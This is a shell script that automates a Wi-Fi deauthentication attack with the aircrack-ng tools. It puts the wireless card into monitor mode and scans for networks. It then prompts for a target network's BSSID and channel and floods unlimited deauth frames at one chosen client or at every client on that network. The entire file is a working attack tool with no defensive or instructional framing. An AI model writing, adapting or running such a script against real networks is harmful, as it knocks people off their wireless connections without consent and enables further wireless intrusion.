#!/bin/sh
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
echo ""
echo ""
read -p "Enter the BSSID of your Target Network: " BSSID
read -p "Enter the Channel of your Target Network: " CH
echo "$BSSID is the BSSID and $CH is the Channel of your target network"
sudo iwconfig wlan0mon channel $CH
sleep 5
clear
echo "1. Deauth Attack a target on the network"
echo "2. Deauth Attack everyone on the network"
read -p "> " DEAUTH_OPTION

if [ $DEAUTH_OPTION -eq 1 ]
then
	clear
	sudo airodump-ng -d $BSSID -c $CH wlan0mon
	read -p "Enter your target's BSSID: " TARGET_BSSID
	echo "Launching Deauth Attack on your target"
	sudo aireplay-ng -0 0 -a $BSSID -c $TARGET_BSSID wlan0mon
elif [ $DEAUTH_OPTION -eq 2 ]
then
	clear
	echo "Launching Death Attack on everyone on the specified network"
	sudo aireplay-ng -0 0 -a $BSSID wlan0mon
fi
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
sudo dhclient wlan0
